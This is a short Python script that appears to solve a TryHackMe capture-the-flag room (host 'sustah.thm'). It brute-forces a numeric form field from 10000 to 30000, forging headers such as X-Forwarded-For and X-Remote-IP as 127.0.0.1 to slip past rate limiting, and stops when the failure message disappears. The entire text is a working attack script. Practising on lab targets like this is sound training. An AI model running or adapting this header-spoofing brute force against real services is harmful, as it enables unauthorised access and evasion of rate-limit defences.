import requests


url ="http://sustah.thm:8085"
header={'X-Originating-IP': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1', 'X-Remote-IP': '127.0.0.1', 'X-Remote-Addr': '127.0.0.1', 'X-Client-IP': '127.0.0.1', 'X-Host': '127.0.0.1', 'X-Forwared-Host': '127.0.0.1'}

print("[+] Starting the script")
for i in range(10000,30000):
    
    r = requests.post(url, headers=header, data={"number":f"{i}"}, proxies={"http":"http://127.0.0.1:8080"})
    if "Oh no! How unlucky. Spin the wheel and try again." not in r.text:
        print(f"Number found: {i} ")
        exit()
